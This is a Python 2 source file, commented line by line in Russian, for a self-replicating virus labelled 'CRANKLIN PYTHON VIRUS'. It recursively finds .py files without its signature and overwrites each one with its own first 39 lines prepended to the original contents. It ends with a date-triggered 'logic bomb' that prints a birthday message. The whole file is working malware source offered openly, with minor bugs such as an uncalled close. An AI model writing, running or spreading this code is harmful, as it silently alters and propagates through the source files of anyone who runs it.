#!/usr/bin/python
# -*- coding: utf-8 -*-

#Импорт модулей
import os;
import datetime;
#Сигнатура
SIGNATURE = "CRANKLIN PYTHON VIRUS"

#Функция поиска файлов
def search(path):
	#Файлы которые нужно инфицировать
	filestoinfect = [];
	#Получаем все файлы и папки из текущего пути
	filelist = os.listdir(path);
	#Проходимся по всему списку
	for fname in filelist:
		#Если эта директория путь + список всего что находится в это дире то
		if os.path.isdir(path+"/"+fname):
			#Добовляем в конец элементов список файлов из диры
			filestoinfect.extend(search(path+"/"+fname));
			#Если разширение py то
		elif fname[-3:] == ".py":
			#Если разширение py то
			infected = False; 
			#Открываем каждый файл
			for line in open(path+"/"+fname):
				#Если сигнатура гденить есть
				if SIGNATURE in line:
					#Файл заражен
					infected = True;
					#прекаращение работы программы
					break;
				#Если он не инфицирован то
				if infected == False:
				#Добавляем в список для инфицирования
					filestoinfect.append(path+"/"+fname);
	#Возвращаем этот список
	return filestoinfect

#Процедура инфицирования
def infect(filestoinfect):
	#Открываем текущий файл
	virus = open(os.path.abspath(__file__)) #открываем текущий файл
	virusstring = "";
	#Cоздаем список кортежей
	for i,line in enumerate(virus):
		#Ежели и больше 0 и меньше 39 то
		if i>=0 and i <39:
			#Cтрока вируса прибовляем строки из файла
			virusstring += line;
	#Закрываем 
	virus.close
	#Проходимся по всему списку
	for fname in filestoinfect:
		f = open(fname);
		#Читаем все
		temp = f.read();
		#Закрыем
		f.close();
		#Открываем файл
		f = open(fname,"w"); 
		#Записываем все туды
		f.write(virusstring + temp);
		#Закрыем
		f.close();

def bomb():
	#Ежели сегодня 25 января то
	if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
		#Пишем мессагу
		print "HAPPY BIRTHDAY CRANKLIN!";

#Получаем обсалютный путь
filestoinfect = search(os.path.abspath(""));
#Процедура инфицирования
infect(filestoinfect);
#Логичская бомба
bomb();
